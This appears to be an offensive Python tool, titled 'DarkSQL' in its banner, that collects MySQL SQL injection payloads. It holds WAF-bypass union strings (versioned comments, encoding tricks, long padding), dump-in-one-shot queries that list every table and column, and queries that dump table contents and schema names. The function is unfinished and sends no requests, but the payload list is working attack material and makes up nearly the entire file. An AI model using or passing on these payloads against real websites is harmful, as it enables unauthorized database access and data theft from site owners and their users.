import requests

print("""\033[1;93m

\033[1;93m████████▄     ▄████████    ▄████████    ▄█   ▄█▄    \033[1;91m▄████████ ████████▄    ▄█       
\033[1;93m███   ▀███   ███    ███   ███    ███   ███ ▄███▀   \033[1;91m███    ███ ███    ███  ███       
\033[1;93m███    ███   ███    ███   ███    ███   ███▐██▀     \033[1;91m███    █▀  ███    ███  ███       
\033[1;93m███    ███   ███    ███  ▄███▄▄▄▄██▀  ▄█████▀      \033[1;91m███        ███    ███  ███       
\033[1;93m███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀▀█████▄    \033[1;91m▀███████████ ███    ███  ███       
\033[1;93m███    ███   ███    ███ ▀███████████   ███▐██▄           \033[1;91m ███ ███    ███  ███       
\033[1;93m███   ▄███   ███    ███   ███    ███   ███ ▀███▄   \033[1;91m ▄█    ███ ███  ▀ ███  ███▌    ▄ 
\033[1;93m████████▀    ███    █▀    ███    ███   ███   ▀█▀  \033[1;91m▄████████▀   ▀██████▀▄█ █████▄▄██ 
             \033[1;93m             ███    ███   ▀                                  ▀         

""")


def payloading_tool(website_path, order_start="1", order_by="100"):
    w1 = "/**8**/"
    w2 = "%23%0a"
    w3 = "/*!50000"
    w3a = "*/"
    w4 = "%250a"
    w5 = "%23++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%0a"
    w6 = "%23AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0a"
    w7 = "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%09"
    w8 = "--%20-%0A"
    w9 = "/**8**/DisTIncTrow%23AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0a"
    w10 = "%2523AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0A"
    
    union = "/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/"
    union1 = "/**8**/and/**8**/0/**8**//*!50000UniOn*//**8**//*!50000select*//**8**/"
    union2 = "%20and%200+/**8**//*!50000UniON*/%20/*!50000sEleCt*/%20"
    bof = "+and+mod(9,9)+/*!50000UniON*/%23AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0A/*!50000sEleCt*/+"
    bof2 = "+and+mod(9,9)+/*!50000UniON*/%09++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++/*!50000sEleCt*/+"
    urlencode = "+div+0+/*!50000%55NIoN*/+/*!50000%53eLEct*/+"
    double_url = "+and+mod(9,9)%20unION%2523aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aSelect%20"
    whitespaces = "%0aand%0a0%0aUniON%0aselect%0A"
    basic_1 = "/**//*!12345UNION+SELECT*//**/"
    
    local = "n"
    
    dios4 = "(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0x3a3a,2)),@,2))"
    dios3 = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(%60InFoRMAtiON_sCHeM%60.%60ColUMNs%60)where(%60TAblE_sCHemA%60=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c6c693e,TaBLe_nAMe,0x3a3a,column_name))))a)"
    dios2 = "export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)"
    dios1 = "(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*//**8**/))))x)"
    dios9 = "(select(@x)${by}from${by}(${by}select${by}(@x:=0x00),(select(0)${by}From${by}(${by}information_schema.columns${by})${by}where${by}(table_schema=database${by}/**_**/())and(0x00)in(@x:=coNcat${by}/**8**/(@x,0x3c6c693e,${by}table_name${by},0x3a3a,${by}column_name${by}))))x)"
    
    Dump = "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,${colon}))))x)"
    Dump1 = "(SELECT+GROUP_CONCAT(0x3c6c693e,${colon})+FROM+${table})"
    Dump2 = "(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=/*!50000CONCAT*//**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
    Dump3 = "(SELECT+/*!50000GROUP_CONCAT*//**8**/(0x3c6c693e,${colon})+/*!50000FROM*/+${table})"
    Dump4 = "(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
    Dump99 = "(SELECT(@x)${by}FROM${by}(SELECT${by}(@x:=0x00),(SELECT(@x)${by}FROM${by}($table)WHERE(@x)IN(@x:=CONCAT${by}/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
    Dump9 = "(SELECT+GROUP_CONCAT${by}/**8**/(0x3c6c693e,${colon})+${by}FROM${by}+${table})"
    
    Dump_db = "(select%20group_concat(0x3c6c693e,schema_name,0x3c6c693e)%20from%20information_schema.schemata)"
    ddbs = "(select%20group_concat(0x3c6c693e,/*!50000schema_name*/,0x3c6c693e)%20/*!50000from*/%20/*!50000information_schema.schemata*/)"
    ddbs1 = "(SELECT%20/*!50000GROUP_CONCAT*/(0x3c6c693e,/*!50000schema_name*/,0x3c6c693e)%20/*!50000FROM*/%20/*!50000INFORMATION_SCHEMA.SCHEMATA*/)"
    ddbs2 = "(SELECT%20(@x)%20/*!50000FROM*/%20(SELECT%20(@x:=0x00),(@NR_DB:=0),(SELECT%20(0)%20/*!50000FROM*/%20(/*!50000INFORMATION_SCHEMA.SCHEMATA*/)%20/*!50000WHERE*/%20(@x)%20IN%20(@x:=CONCAT/**8**/(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x3c6c693e,/*!50000schema_name*/,0x3c6c693e))))x)"
    ddbs9 = "(select%20group_concat${by}(0x3c6c693e,schema_name,0x3c6c693e)%20${by}from${by}%20${by}information_schema.schemata${by})"
    
    print("""\033[1;96menter the file that contains website so it will payload the websites""")
    
# Example usage
payloading_tool("http://example.com")
